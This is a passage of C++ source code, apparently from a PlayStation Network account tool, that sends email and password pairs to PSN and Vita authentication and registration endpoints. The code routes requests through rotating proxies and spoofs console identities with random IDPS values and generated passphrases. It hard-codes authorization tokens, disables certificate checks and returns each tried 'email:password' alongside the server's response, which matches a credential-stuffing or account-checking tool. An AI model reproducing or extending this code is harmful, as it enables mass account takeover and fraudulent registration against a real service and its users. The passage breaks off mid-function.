					case CURLE_FTP_ACCEPT_TIMEOUT:
						return (char*)"12:FTP_ACCEPT_TIMEOUT";
						break;
					case CURLE_FTP_WEIRD_PASV_REPLY:
						return (char*)"13:FTP_WEIRD_PASV_REPLY";
						break;
					case CURLE_FTP_WEIRD_227_FORMAT:
						return (char*)"14:FTP_WEIRD_227_FORMAT";
						break;
					case CURLE_FTP_CANT_GET_HOST:
						return (char*)"15:FTP_CANT_GET_HOST";
						break;
					case CURLE_HTTP2:
						return (char*)"16:HTTP2";
						break;
					case CURLE_FTP_COULDNT_SET_TYPE:
						return (char*)"17:FTP_COULDNT_SET_TYPE";
						break;
					case CURLE_PARTIAL_FILE:
						return (char*)"18:PARTIAL_FILE";
						break;
					case CURLE_FTP_COULDNT_RETR_FILE:
						return (char*)"19:FTP_COULDNT_RETR_FILE";
						break;
					case CURLE_OBSOLETE20:
						return (char*)"20:OBSOLETE20";
						break;
					case CURLE_QUOTE_ERROR:
						return (char*)"21:QUOTE_ERROR";
						break;
					case CURLE_HTTP_RETURNED_ERROR:
						return (char*)"22:HTTP_RETURNED_ERROR";
						break;
					case CURLE_WRITE_ERROR:
						return (char*)"23:WRITE_ERROR";
						break;
					case CURLE_OBSOLETE24:
						return (char*)"24:OBSOLETE24";
						break;
					case CURLE_UPLOAD_FAILED:
						return (char*)"25:UPLOAD_FAILED";
						break;
					case CURLE_READ_ERROR:
						return (char*)"26:READ_ERROR";
						break;
					case CURLE_OUT_OF_MEMORY:
						return (char*)"27:OUT_OF_MEMORY";
						break;
					case CURLE_OPERATION_TIMEDOUT:
						return (char*)"28:OPERATION_TIMEDOUT";
						break;
					case CURLE_OBSOLETE29:
						return (char*)"29:OBSOLETE29";
						break;
					case CURLE_FTP_PORT_FAILED:
						return (char*)"30:FTP_PORT_FAILED";
						break;
					case CURLE_FTP_COULDNT_USE_REST:
						return (char*)"31:FTP_COULDNT_USE_REST";
						break;
					case CURLE_OBSOLETE32:
						return (char*)"32:OBSOLETE32";
						break;
					case CURLE_RANGE_ERROR:
						return (char*)"33:RANGE_ERROR";
						break;
					case CURLE_HTTP_POST_ERROR:
						return (char*)"34:HTTP_POST_ERROR";
						break;
					case CURLE_SSL_CONNECT_ERROR:
						return (char*)"35:SSL_CONNECT_ERROR";
						break;
					case CURLE_BAD_DOWNLOAD_RESUME:
						return (char*)"36:BAD_DOWNLOAD_RESUME";
						break;
					case CURLE_FILE_COULDNT_READ_FILE:
						return (char*)"37:FILE_COULDNT_READ_FILE";
						break;
					case CURLE_LDAP_CANNOT_BIND:
						return (char*)"38:LDAP_CANNOT_BIND";
						break;
					case CURLE_LDAP_SEARCH_FAILED:
						return (char*)"39:LDAP_SEARCH_FAILED";
						break;
					case CURLE_OBSOLETE40:
						return (char*)"40:OBSOLETE40";
						break;
					case CURLE_FUNCTION_NOT_FOUND:
						return (char*)"41:FUNCTION_NOT_FOUND";
						break;
					case CURLE_ABORTED_BY_CALLBACK:
						return (char*)"42:ABORTED_BY_CALLBACK";
						break;
					case CURLE_BAD_FUNCTION_ARGUMENT:
						return (char*)"43:BAD_FUNCTION_ARGUMENT";
						break;
					case CURLE_OBSOLETE44:
						return (char*)"44:OBSOLETE44";
						break;
					case CURLE_INTERFACE_FAILED:
						return (char*)"45:INTERFACE_FAILED";
						break;
					case CURLE_OBSOLETE46:
						return (char*)"46:OBSOLETE46";
						break;
					case CURLE_TOO_MANY_REDIRECTS:
						return (char*)"47:TOO_MANY_REDIRECTS";
						break;
					case CURLE_UNKNOWN_OPTION:
						return (char*)"48:UNKNOWN_OPTION";
						break;
					case CURLE_TELNET_OPTION_SYNTAX:
						return (char*)"49:TELNET_OPTION_SYNTAX";
						break;
					case CURLE_OBSOLETE50:
						return (char*)"50:OBSOLETE50";
						break;
					case CURLE_OBSOLETE51:
						return (char*)"51:OBSOLETE51";
						break;
					case CURLE_GOT_NOTHING:
						return (char*)"52:GOT_NOTHING";
						break;
					case CURLE_SSL_ENGINE_NOTFOUND:
						return (char*)"53:SSL_ENGINE_NOTFOUND";
						break;
					case CURLE_SSL_ENGINE_SETFAILED:
						return (char*)"54:SSL_ENGINE_SETFAILED";
						break;
					case CURLE_SEND_ERROR:
						return (char*)"55:SEND_ERROR";
						break;
					case CURLE_RECV_ERROR:
						return (char*)"56:RECV_ERROR";
						break;
					case CURLE_OBSOLETE57:
						return (char*)"57:OBSOLETE57";
						break;
					case CURLE_SSL_CERTPROBLEM:
						return (char*)"58:SSL_CERTPROBLEM";
						break;
					case CURLE_SSL_CIPHER:
						return (char*)"59:SSL_CIPHER";
						break;
					case CURLE_PEER_FAILED_VERIFICATION:
						return (char*)"60:PEER_FAILED_VERIFICATION";
						break;
					case CURLE_BAD_CONTENT_ENCODING:
						return (char*)"61:BAD_CONTENT_ENCODING";
						break;
					case CURLE_LDAP_INVALID_URL:
						return (char*)"62:LDAP_INVALID_URL";
						break;
					case CURLE_FILESIZE_EXCEEDED:
						return (char*)"63:FILESIZE_EXCEEDED";
						break;
					case CURLE_USE_SSL_FAILED:
						return (char*)"64:USE_SSL_FAILED";
						break;
					case CURLE_SEND_FAIL_REWIND:
						return (char*)"65:SEND_FAIL_REWIND";
						break;
					case CURLE_SSL_ENGINE_INITFAILED:
						return (char*)"66:SSL_ENGINE_INITFAILED";
						break;
					case CURLE_LOGIN_DENIED:
						return (char*)"67:LOGIN_DENIED";
						break;
					case CURLE_TFTP_NOTFOUND:
						return (char*)"68:TFTP_NOTFOUND";
						break;
					case CURLE_TFTP_PERM:
						return (char*)"69:TFTP_PERM";
						break;
					case CURLE_REMOTE_DISK_FULL:
						return (char*)"70:REMOTE_DISK_FULL";
						break;
					case CURLE_TFTP_ILLEGAL:
						return (char*)"71:TFTP_ILLEGAL";
						break;
					case CURLE_TFTP_UNKNOWNID:
						return (char*)"72:TFTP_UNKNOWNID";
						break;
					case CURLE_REMOTE_FILE_EXISTS:
						return (char*)"73:REMOTE_FILE_EXISTS";
						break;
					case CURLE_TFTP_NOSUCHUSER:
						return (char*)"74:TFTP_NOSUCHUSER";
						break;
					case CURLE_CONV_FAILED:
						return (char*)"75:_CONV_FAILED";
						break;
					case CURLE_CONV_REQD:
						return (char*)"76:CONV_REQD";
						break;
					case CURLE_SSL_CACERT_BADFILE:
						return (char*)"77:SSL_CACERT_BADFILE";
						break;
					case CURLE_REMOTE_FILE_NOT_FOUND:
						return (char*)"78:REMOTE_FILE_NOT_FOUND";
						break;
					case CURLE_SSH:
						return (char*)"79:SSH";
						break;
					case CURLE_SSL_SHUTDOWN_FAILED:
						return (char*)"80:SSL_SHUTDOWN_FAILED";
						break;
					case CURLE_AGAIN:
						return (char*)"81:AGAIN";
						break;
					case CURLE_SSL_CRL_BADFILE:
						return (char*)"82:SSL_CRL_BADFILE";
						break;
					case CURLE_SSL_ISSUER_ERROR:
						return (char*)"83:SSL_ISSUER_ERROR";
						break;
					case CURLE_FTP_PRET_FAILED:
						return (char*)"84:FTP_PRET_FAILED";
						break;
					case CURLE_RTSP_CSEQ_ERROR:
						return (char*)"85:RTSP_CSEQ_ERROR";
						break;
					case CURLE_RTSP_SESSION_ERROR:
						return (char*)"86:RTSP_SESSION_ERROR";
						break;
					case CURLE_FTP_BAD_FILE_LIST:
						return (char*)"87:FTP_BAD_FILE_LIST";
						break;
					case CURLE_CHUNK_FAILED:
						return (char*)"88:CHUNK_FAILED";
						break;
					case CURLE_NO_CONNECTION_AVAILABLE:
						return (char*)"89:NO_CONNECTION_AVAILABLE";
						break;
					case CURLE_SSL_PINNEDPUBKEYNOTMATCH:
						return (char*)"90:SSL_PINNEDPUBKEYNOTMATCH";
						break;
					case CURLE_SSL_INVALIDCERTSTATUS:
						return (char*)"91:SSL_INVALIDCERTSTATUS";
						break;
					case CURLE_HTTP2_STREAM:
						return (char*)"92:HTTP2_STREAM";
						break;
					case CURLE_RECURSIVE_API_CALL:
						return (char*)"93:RECURSIVE_API_CALL";
						break;
					case CURLE_AUTH_ERROR:
						return (char*)"94:AUTH_ERROR";
						break;
					case CURLE_HTTP3:
						return (char*)"95:HTTP3";
						break;
					case CURLE_QUIC_CONNECT_ERROR:
						return (char*)"96:QUIC_CONNECT_ERROR";
						break;


					}
					*/
				return (char*)"UNKNOWN ERROR";
			}
			/*curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);*/
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
		//curl = curl_easy_init();
		//uint64_t outlen;
		//char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen);

		//response_string = decodeast;
		//
		//string combine = "______________________";
		//string contentstring = header_string + response_string;
		//string resultstring = header_string + combine + response_string + combine + contentstring;

		//auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 8));
		//

		//sprintf_s(strres, header_string.length() + combine.length() + response_string.length() + combine.length() + contentstring.length()+4, "%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),  combine.c_str(),contentstring.c_str(), res);


		//curl_global_cleanup();

		//mut.unlock();
		//fctPointer(strres);
		//return strres;
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}

char* tttmainpsnfunk(char* e, char* p, char* c, char* px, int pxt)
{

	//auto fut = ansyc(thmainpsnfunk, e,p,c,px,pxt);
	//2021.03.31-------------update
	// 	int state = 0;
// 	char* gStrResult = new char[8192];
// 	return mainpsnfunk(e, p, c, px, pxt, gStrResult, &state);
// 
// 	//thread tthread = thread(mainpsnfunk, e, p, c, px, pxt, gStrResult,&state, fctPointer);
// 	//tthread.join();
// 
// 	//while (!state);
// 
// 
// 
// 	return NULL;
	return mainpsnfunk(e, p, c, px, pxt);
}


char* crssVitaConfig(char* e, char* p, char* c, char* px, int pxt)
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "version=8&username=" + email + "&password=" + pass + "&consoleid=" + console;
		//cout << par;
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			//char post[5000];

			//strcpy_s(post, par.length(),par.c_str());
			//cout << par.c_str();
			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: native-vita.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "User-Agent: My heart leaps up when I behold A rainbow in the sky");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "Authorization: Basic cjI0NjpHUG9FZmJkYQ==");
			chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");

			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());



			curl_easy_setopt(curl, CURLOPT_URL, "https://native-vita.np.ac.playstation.net/native/store/crSess.action");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}
			//2021.3.31----update(memory-clean)
			if (strings.size() > 0)
				strings.~vector();
			//2021.3.31----update(memory-clean)


			curl_easy_setopt(curl, CURLOPT_USERAGENT, "My heart leaps up when I behold A rainbow in the sky");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);

			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();
		/*	uint64_t outlen2;
			char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen2);

			response_string = decodeast;*/

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();
			if (res != CURLE_OK)
			{
				return (char*)"UNKNOWN ERROR";
			}
		
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}

char* crssVitaMethod(char* e, char* p, char* c, char* px, int pxt)
{
	return crssVitaConfig(e, p, c, px, pxt);
}



char* ConfigReg(char* e, char* p, char* c, char* px, int pxt)//2021.03.31--------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);


		string par = "serviceid=ep4950-npeb02222_00&serviceentity=urn:service-entity:psn3&loginid=" + email + "&password="+ pass +"&first=true&consoleid=" + console;



		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];

			choose_rand_idps(idps, ps3_ids);


			char idps_ascii[0x21] = { 0 };
			char platform_passphrase_header[0x500];
			sprintf_s(idps_ascii, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", idps[0], idps[1], idps[2], idps[3], idps[4], idps[5], idps[6], idps[7], idps[8], idps[9], idps[10], idps[11], idps[12], idps[13], idps[14], idps[15]);
			char* passphrase = generate_hwframework(idps_ascii, npid_ascii);
			sprintf_s(platform_passphrase_header, "X-I-5-Passphrase: %s", passphrase);

			//char post[50000];

			//sprintf_s(post, par.c_str());

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;
			chunk = curl_slist_append(chunk, "Host: IV0001-NPXS01001_00.auth.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Lediatio Lunto Ritna");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "X-I-5-Version: 4.0");
			chunk = curl_slist_append(chunk, "X-Platform-Passphrase: 53914a148a95d51d34285ccf5827670f40ef4a8d825cf461b230a90a");
			chunk = curl_slist_append(chunk, "X-Platform-Version: PS3_C 04.87");
			chunk = curl_slist_append(chunk, "Accept:");
			chunk = curl_slist_append(chunk, platform_passphrase_header);

			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\Root_0555.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\Root_0555.cer");



			curl_easy_setopt(curl, CURLOPT_URL, "https://scei-0.auth.np.ac.playstation.net/nav/auth");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Lediatio Lunto Ritna");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//
			// 
			// char nline[5000];
			//res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);

			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();
			uint64_t outlen2;
			char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen2);

			response_string = decodeast;

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();
			//2021.3.31
// 			if (FRAMEWORK != NULL)
// 				free(FRAMEWORK);
			
			

			if (res != CURLE_OK)
			{
				return (char*)"UNKNOWN ERROR";
			}

			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}

	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}

char* RegMethod(char* e, char* p, char* c, char* px, int pxt)
{
	/*
	int state = 0;
	char* gStrResult = new char[8192];
	return ConfigReg(e, p, c, px, pxt, gStrResult, &state);


	return NULL;
	*/
	return ConfigReg(e, p, c, px, pxt);
}


char* ConfigReg2(char* e, char* p, char* c, char* px, int pxt)//2021.03.31--------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "version=25&account.country=BG&account.language=en&account.yob=1999&account.mob=2&account.dob=2&consoleId=" + console + "&serviceEntity=urn:service-entity:psn2";
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
		
			string cookies;

			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.7-000 (CellOS)");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
			chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");


			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");

			curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/reg/startReg.action");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}




			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
			curl_easy_setopt(curl, CURLOPT_COOKIELIST, &cookies);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
		
			res = curl_easy_perform(curl);

		

			//nextStep
			chunk = NULL;
			response_string = "";
			header_string = "";
			curl_easy_reset(curl);
			 par = "account.loginName=" + email + "&account.password=bullshitABC212&account.securityQuestion=1&account.securityAnswer=obsolete";

			 char content_length2[40];
			 sprintf_s(content_length2, "Content-Length: %d", strlen(par.c_str()));
			
			 chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
			 chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.7-000 (CellOS)");
			 chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			 chunk = curl_slist_append(chunk, content_length2);
			 chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			 chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			 chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
			 chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			 chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");

			 curl_easy_setopt(curl, CURLOPT_COOKIE, cookies);
